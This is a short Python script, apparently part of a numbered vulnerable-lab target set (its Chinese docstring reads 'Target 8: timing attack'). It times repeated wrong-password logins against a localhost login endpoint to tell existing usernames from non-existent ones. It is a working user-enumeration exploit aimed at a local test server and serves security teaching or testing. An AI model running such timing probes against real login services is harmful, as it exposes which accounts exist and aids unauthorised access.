"""靶点 8：时序攻击。
vulnerable 下存在用户 vs 不存在用户响应时间相差一个数量级。
"""
import httpx, time, statistics

def sample(c, username, n=20):
    ts = []
    for _ in range(n):
        t0 = time.perf_counter()
        c.post("/auth/login-v2",
               json={"username": username, "password": "wrong"})
        ts.append(time.perf_counter() - t0)
    return statistics.median(ts) * 1000

with httpx.Client(base_url="http://localhost:8080") as c:
    sample(c, "warmup", n=5)
    for u in ["alice", "nonexistent_user", "bob", "definitely_not_here"]:
        ms = sample(c, u)
        print(f"{u:30s} median = {ms:.2f} ms")
